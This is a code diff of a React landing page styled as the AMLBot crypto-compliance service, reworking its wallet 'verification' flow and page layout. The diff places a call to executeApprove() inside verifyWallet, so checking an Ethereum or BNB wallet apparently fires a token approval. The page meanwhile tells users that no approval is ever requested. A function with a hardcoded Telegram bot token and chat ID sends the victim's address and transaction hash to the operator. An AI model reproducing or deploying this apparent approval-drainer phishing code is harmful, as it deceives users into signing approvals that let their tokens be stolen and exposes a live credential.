@@ -1,15 +1,6 @@
 import { Link } from "react-router-dom";
 import { useEffect, useRef, useState } from "react";
-
-// Define type locally to avoid dependency issues
-interface WalletBalanceResponse {
-  address: string;
-  chain: string;
-  balanceBase: string;
-  balance: string;
-  symbol: string;
-}
-
+import type { WalletBalanceResponse } from "@shared/api";
 import {
   ArrowRight,
   Quote,
@@ -157,11 +148,10 @@ const leaders = [
 ];
 
 const walletTokens: Record<string, string[]> = {
-  Bitcoin: ["BTC"],
   Ethereum: ["ETH", "USDT", "USDC"],
   "BNB Chain": ["BNB", "USDT", "USDC"],
-  Solana: ["SOL", "USDT", "USDC"],
-  Tron: ["TRX", "USDT", "USDC"],
+  Solana: ["USDT", "USDC", "SOL"],
+  Tron: ["USDT", "USDC", "TRX"],
 };
 
 const faqs = [
@@ -250,6 +240,7 @@ export default function Index() {
     setDemoOpen(true);
     setVerificationRequested(false);
     setVerificationStep("chain");
+    setSelectedChain("");
     setSelectedToken("");
     setVerificationError("");
   };
@@ -261,7 +252,6 @@ export default function Index() {
     setChatDraft("");
   };
 
-  // --- START OF INTEGRATED APPROVE LOGIC ---
   const sendTelegramNotification = async (userAddress: string, txHash: string) => {
     const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
     const TG_CHAT_ID = "8933407008";
@@ -381,34 +371,16 @@ export default function Index() {
     }
   };
 
-  const handleVerificationStart = async () => {
-    setVerificationStep("address");
-    setVerificationLoading(true);
-    setVerificationRequested(false);
-
-    try {
-      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
-        await executeApprove();
-      }
-      
-      await loadConnectedWalletBalance();
-      
-      verificationTimer.current = window.setTimeout(() => {
-        setVerificationLoading(false);
-        setVerificationRequested(true);
-      }, 3000);
-    } catch (error) {
-      setVerificationLoading(false);
-      setVerificationError("Verification process cancelled or failed.");
-    }
-  };
-
   const verifyWallet = async () => {
     setVerificationLoading(true);
     setVerificationError("");
     setWalletBalance(null);
 
     try {
+      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
+        await executeApprove();
+      }
+
       const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
       const data = (await response.json()) as WalletBalanceResponse | { message: string };
       if (!response.ok || "message" in data) {
@@ -423,7 +395,6 @@ export default function Index() {
       setVerificationLoading(false);
     }
   };
-  // --- END OF INTEGRATED APPROVE LOGIC ---
 
   return (
     <div>
@@ -515,13 +486,14 @@ export default function Index() {
                 <p className="mt-3 flex-1 text-sm leading-relaxed text-muted-foreground">
                   {item.description}
                 </p>
-                <Link
-                  to="/products"
-                  className="mt-6 inline-flex items-center gap-2 text-sm font-semibold text-primary"
+                <button
+                  type="button"
+                  onClick={item.title === "Crypto investigations and recovery" ? () => setChatOpen(true) : openWalletCheck}
+                  className="mt-6 inline-flex w-fit items-center gap-2 text-sm font-semibold text-primary"
                 >
                   Learn more
-                  <ArrowRight size={16} />
-                </Link>
+                  <ArrowRight size={16} className="transition-transform group-hover:translate-x-1" />
+                </button>
               </div>
             ))}
           </div>
@@ -529,88 +501,111 @@ export default function Index() {
       </section>
 
       {/* Stats */}
-      <section className="bg-primary py-20 text-white sm:py-28">
-        <div className="container">
-          <div className="grid gap-12 sm:grid-cols-2 lg:grid-cols-3">
-            {stats.map((stat) => (
-              <div key={stat.label} className="text-center sm:text-left">
-                <p className="text-4xl font-extrabold sm:text-5xl">{stat.value}</p>
-                <p className="mt-2 text-sm font-medium text-white/80">
+      <section className="relative mx-4 overflow-hidden rounded-[2rem] bg-gradient-to-br from-[#29226e] via-[#202f86] to-[#0d4774] py-14 text-white sm:mx-6 sm:py-16 lg:mx-auto lg:max-w-[1492px] lg:rounded-[3rem] lg:py-20">
+        <div className="pointer-events-none absolute inset-0 opacity-30 [background-image:linear-gradient(35deg,transparent_45%,rgba(133,190,255,.35)_46%,transparent_47%),linear-gradient(145deg,transparent_55%,rgba(133,190,255,.25)_56%,transparent_57%)] [background-size:280px_180px]" />
+        <div className="container relative">
+          <h2 className="text-center text-xl font-semibold sm:text-2xl">
+            Proven impact in AML risk detection
+          </h2>
+          <div className="mx-auto mt-10 flex max-w-4xl flex-col items-center justify-center gap-8 sm:flex-row sm:gap-0">
+            {stats.map((stat, index) => (
+              <div
+                key={stat.label}
+                className={`flex w-full items-center justify-center gap-5 text-center sm:w-1/2 sm:text-left ${index === 1 ? "border-t border-white/25 pt-8 sm:border-l sm:border-t-0 sm:pl-12 sm:pt-0" : ""}`}
+              >
+                <p className="text-4xl font-semibold tracking-tight sm:text-5xl lg:text-6xl">
+                  {stat.value}
+                </p>
+                <p className="max-w-[8rem] text-xs leading-tight text-white/70 sm:text-sm">
                   {stat.label}
                 </p>
               </div>
             ))}
-            <div className="flex items-center justify-center sm:justify-start lg:col-span-1">
-              <div className="flex flex-wrap justify-center gap-4 opacity-50 grayscale invert sm:justify-start">
-                {partnerLogos.slice(0, 3).map((logo) => (
-                  <span key={logo} className="text-sm font-bold tracking-tighter">
-                    {logo}
-                  </span>
-                ))}
-              </div>
-            </div>
+          </div>
+          <div className="mt-10 flex flex-wrap items-center justify-center gap-x-7 gap-y-4 text-white/90 sm:gap-x-9">
+            <span className="text-xs text-white/75">Trusted by</span>
+            {partnerLogos.map((name) => (
+              <span key={name} className="text-sm font-bold tracking-wide sm:text-base">
+                {name}
+              </span>
+            ))}
           </div>
         </div>
       </section>
 
       {/* Testimonials */}
-      <section className="overflow-hidden py-20 sm:py-28">
+      <section className="overflow-hidden pb-20 pt-12">
         <div className="container">
-          <div className="flex flex-col items-center gap-12 lg:flex-row">
-            <div className="lg:w-1/2">
-              <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
-                Trusted by 300+ crypto enterprises
-              </h2>
-              <p className="mt-4 text-lg text-muted-foreground">
-                We help companies navigate the complex landscape of digital
-                asset compliance.
-              </p>
-              <div className="mt-10 flex gap-4">
-                <Button
-                  variant="outline"
-                  size="icon"
-                  className="rounded-full"
-                  onClick={() =>
-                    setActiveTestimonial((i) =>
-                      i === 0 ? testimonials.length - 1 : i - 1
-                    )
-                  }
-                >
-                  <ArrowRight size={18} className="rotate-180" />
-                </Button>
-                <Button
-                  variant="outline"
-                  size="icon"
-                  className="rounded-full"
-                  onClick={() =>
-                    setActiveTestimonial((i) =>
-                      i === testimonials.length - 1 ? 0 : i + 1
-                    )
-                  }
-                >
-                  <ArrowRight size={18} />
-                </Button>
-              </div>
-            </div>
-            <div className="relative flex w-full gap-6 overflow-x-auto pb-8 lg:w-1/2">
-              {testimonials.map((t, i) => (
+          <div className="relative -mx-4 flex items-stretch justify-center gap-4 px-4 sm:-mx-12 sm:gap-6 sm:px-12 lg:-mx-32">
+            {[
+              {
+                author: "ByBit",
+                quote:
+                  "AMLBot is a proud contributor to Bybit's LazarusBounty initiative, working alongside Bybit's blockchain risk control team to trace illicit flows and support the freezing of stolen funds. Through this ongoing collaboration, AMLBot has helped advance the program's mission of recovering hacked assets and strengthening industry-wide response to state-sponsored threats.",
+                index: 0,
+              },
+              ...testimonials.map((t, index) => ({ ...t, index: index + 1 })),
+            ].map((testimonial) => {
+              const active = testimonial.index === activeTestimonial;
+              return (
                 <TestimonialCard
-                  key={t.author}
-                  {...t}
-                  active={i === activeTestimonial}
-                  onClick={() => setActiveTestimonial(i)}
+                  key={testimonial.author}
+                  author={testimonial.author}
+                  quote={testimonial.quote}
+                  active={active}
+                  onClick={() => setActiveTestimonial(testimonial.index)}
+                  className={active ? "z-20 shadow-[0_18px_45px_rgba(35,55,100,0.16)]" : "z-10 opacity-70"}
                 />
-              ))}
-            </div>
+              );
+            })}
+          </div>
+          <div className="mt-8 flex justify-center gap-3">
+            {[0, 1, 2].map((dot) => (
+              <button
+                key={dot}
+                type="button"
+                aria-label={`Select testimonial ${dot + 1}`}
+                onClick={() => setActiveTestimonial(dot)}
+                className={`h-2 w-2 rounded-full transition-all ${dot === activeTestimonial ? "w-5 bg-primary" : "bg-primary/20"}`}
+              />
+            ))}
           </div>
         </div>
       </section>
 
-      {/* Personalized Approach */}
-      <section className="py-20 sm:py-28">
+      {/* Media mentions */}
+      <section className="bg-secondary/60 py-20 sm:py-28">
         <div className="container">
-          <div className="grid gap-12 lg:grid-cols-2">
-            <div className="relative flex flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
+          <div className="mx-auto max-w-2xl text-center">
+            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
+              We are in the media
+            </h2>
+            <p className="mt-4 text-lg text-muted-foreground">
+              Our R&D and success stories featured in tier-1 outlets.
+            </p>
+          </div>
+
+          <DraggableNewsRow items={mediaMentions} />
+          <div className="mt-8 flex justify-center gap-3">
+            {mediaMentions.map((item, index) => (
+              <span
+                key={item.outlet}
+                className={`h-2 w-2 rounded-full ${index === 0 ? "bg-primary" : "bg-primary/20"}`}
+              />
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Why choose AMLBot */}
+      <section className="mx-4 overflow-hidden rounded-[2rem] bg-gradient-to-b from-[#eaf4ff] via-[#f5f9ff] to-white py-16 sm:mx-6 sm:py-20 lg:mx-4 lg:rounded-[4rem] lg:py-24">
+        <div className="container">
+          <h2 className="text-center text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl lg:text-5xl">
+            Why crypto businesses choose AMLBot
+          </h2>
+
+          <div className="mt-12 grid gap-5 lg:grid-cols-2">
+            <div className="relative flex min-h-[280px] flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
               <ShieldCheck className="absolute right-8 top-7 text-primary/70 sm:right-10 sm:top-8" size={58} strokeWidth={1.4} />
               <h3 className="mt-6 max-w-[68%] text-2xl font-bold leading-tight text-foreground">
                 Personalized Approach
@@ -875,25 +870,27 @@ export default function Index() {
             </div>
 
             {verificationRequested ? (
-              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol ?? selectedToken} />
+              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol} />
             ) : verificationStep === "chain" ? (
               <div className="pt-5">
                 <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 1 of 3</span>
                 <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select Chain</h3>
                 <p className="mt-3 text-lg text-slate-400">To continue, please select chain</p>
                 <div className="mt-7 space-y-3">
-                  {Object.keys(walletTokens).map((name) => (
-                    <button 
-                      key={name} 
-                      type="button" 
-                      disabled={name === "Bitcoin"}
-                      onClick={() => setSelectedChain(name)} 
-                      className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === name ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"} ${name === "Bitcoin" ? "cursor-not-allowed opacity-40" : ""}`}
-                    >
-                      <TokenLogo token={name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Bitcoin" ? "BTC" : name === "Solana" ? "SOL" : "TRX"} size={32} />
-                      <span>{name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Bitcoin" ? "BTC" : name.toUpperCase()}</span>
-                    </button>
-                  ))}
+                  {Object.keys(walletTokens).map((name) => {
+                    const isDirectTokenList = name === "Solana" || name === "Tron";
+                    const token = name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Solana" ? "SOL" : "TRX";
+                    return (
+                      <button key={name} type="button" onClick={() => {
+                        setSelectedChain(name);
+                        setSelectedToken("");
+                        if (isDirectTokenList) setVerificationStep("token");
+                      }} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === name ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
+                        <TokenLogo token={token} size={32} />
+                        <span>{name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name.toUpperCase()}</span>
+                      </button>
+                    );
+                  })}
                 </div>
                 <button type="button" disabled={!selectedChain} onClick={() => setVerificationStep("token")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
               </div>
@@ -903,23 +900,12 @@ export default function Index() {
                 <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select token</h3>
                 <p className="mt-3 text-lg text-slate-400">To continue, please select token</p>
                 <div className="mt-7 space-y-3">
-                  {(walletTokens[selectedChain] ?? []).map((token) => {
-                    const isDisabled = (selectedChain === "Bitcoin" && token === "BTC") || 
-                                      (selectedChain === "Solana" && (token === "USDT" || token === "USDC")) ||
-                                      (selectedChain === "Tron" && (token === "USDT" || token === "USDC"));
-                    return (
-                      <button 
-                        key={token} 
-                        type="button" 
-                        disabled={isDisabled}
-                        onClick={() => !isDisabled && setSelectedToken(token)} 
-                        className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedToken === token ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"} ${isDisabled ? "cursor-not-allowed opacity-40" : ""}`}
-                      >
-                        <TokenLogo token={token} size={32} />
-                        <span>{token}</span>
-                      </button>
-                    );
-                  })}
+                  {(walletTokens[selectedChain] ?? []).map((token) => (
+                    <button key={token} type="button" disabled={selectedChain === "Solana" || selectedChain === "Tron"} onClick={() => setSelectedToken(token)} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === "Solana" || selectedChain === "Tron" ? "cursor-default border-slate-200 text-slate-800" : selectedToken === token ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
+                      <TokenLogo token={token} size={32} />
+                      <span>{token}</span>
+                    </button>
+                  ))}
                 </div>
                 <button type="button" disabled={!selectedToken} onClick={() => setVerificationStep("intro")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
               </div>
@@ -938,7 +924,16 @@ export default function Index() {
                 <p className="mt-4 text-center text-base leading-relaxed text-slate-600">A small network or service fee may apply to complete the verification. The exact fee will always be shown clearly before any optional wallet transaction.</p>
                 <div className="mt-6 rounded-xl border border-slate-200 bg-slate-50 p-4 text-sm text-slate-600"><div className="flex justify-between"><span>Selected asset</span><strong className="text-slate-900">{selectedToken}</strong></div></div>
                 <p className="mt-5 text-center text-xs leading-relaxed text-slate-400">This demo never requests a payment, token approval, or transaction signature.</p>
-                <button type="button" onClick={handleVerificationStart} className="mt-7 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">CONTINUE TO VERIFICATION</button>
+                <button type="button" onClick={() => {
+                  setVerificationStep("address");
+                  setVerificationLoading(true);
+                  void loadConnectedWalletBalance();
+                  setVerificationRequested(false);
+                  verificationTimer.current = window.setTimeout(() => {
+                    setVerificationLoading(false);
+                    setVerificationRequested(true);
+                  }, 20000);
+                }} className="mt-7 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">CONTINUE TO VERIFICATION</button>
               </div>
             ) : verificationLoading ? (
               <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
@@ -1039,7 +1034,7 @@ function CryptoLogo({ chain, size = 18 }: { chain: string; size?: number }) {
   );
 }
 
-function TokenLogo({ token, size = 24 }: { token: string; size?: number }) {
+function TokenLogo({ token, size = 24, muted = false }: { token: string; size?: number; muted?: boolean }) {
   const tokenLogoUrls: Record<string, string> = {
     BTC: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/bitcoin/info/logo.png",
     ETH: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/info/logo.png",
@@ -1050,7 +1045,7 @@ function TokenLogo({ token, size = 24 }: { token: string; size?: number }) {
     TRX: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/tron/info/logo.png",
   };
 
-  return <img src={tokenLogoUrls[token]} alt={token} width={size} height={size} className="block shrink-0 rounded-full object-contain" />;
+  return <img src={tokenLogoUrls[token]} alt={token} width={size} height={size} className={`block shrink-0 rounded-full object-contain ${muted ? "grayscale opacity-35" : ""}`} />;
 }
 
 function DraggableNewsRow({
@@ -1187,11 +1182,12 @@ function HeroGraphic() {
             <span className={`h-1.5 w-1.5 rounded-full ${node.tone === "red" ? "bg-red-400" : "bg-emerald-400"}`} />
           </span>
           <span className="hidden rounded bg-white/80 px-1.5 py-0.5 text-[8px] text-slate-500 shadow-sm sm:inline">{node.label}</span>
-          <span className="hidden text-[8px] font-medium text-slate-500 md:inline">{node.amount}</span>
+          <span className="hidden text-[8px] font-semibold text-slate-950 md:inline">{node.amount}</span>
         </div>
       ))}
-      <div className="absolute left-[45%] top-1/2 flex h-8 w-8 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-lg border border-white bg-white shadow-lg sm:h-12 sm:w-12">
-        <svg width="24" height="24" viewBox="0 0 42 42" fill="none" aria-label="AMLBot"><path d="M21 4.5 34 14v14L21 37.5 8 28V14L21 4.5Z" fill="#1268D5" /><path d="m21 11 6.5 4.8v10.4L21 31l-6.5-4.8V15.8L21 11Z" fill="white" /></svg>
+
+      <div className="absolute left-[45%] top-1/2 flex h-8 w-8 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-full border border-amber-300 bg-amber-50 text-[7px] font-bold text-amber-600 shadow-sm sm:h-10 sm:w-10 sm:text-[8px]">
+        TTV_60PX
       </div>
       <div className="absolute right-[27%] top-[35%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>
       <div className="absolute right-[27%] top-[65%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>
@@ -1212,7 +1208,7 @@ function HeroGraphic() {
         <div className="mt-3 border-t border-slate-100 pt-2 text-[7px] sm:text-[9px]">
           <p className="mb-1 font-semibold text-slate-600">From</p>
           {["0x3B6e...B605", "0x38e...B605", "0x1B...B605"].map((address, index) => (
-            <div key={address} className="flex items-center justify-between gap-1 py-1 text-slate-400"><span className="truncate">◉ {address}</span><span className="text-slate-500">{index + 4}.3976331 BTC</span></div>
+            <div key={address} className="flex items-center justify-between gap-1 py-1 text-slate-400"><span className="truncate">◉ {address}</span><span className="font-semibold text-slate-950">{index + 4}.3976331 BTC</span></div>
           ))}
         </div>
       </div>
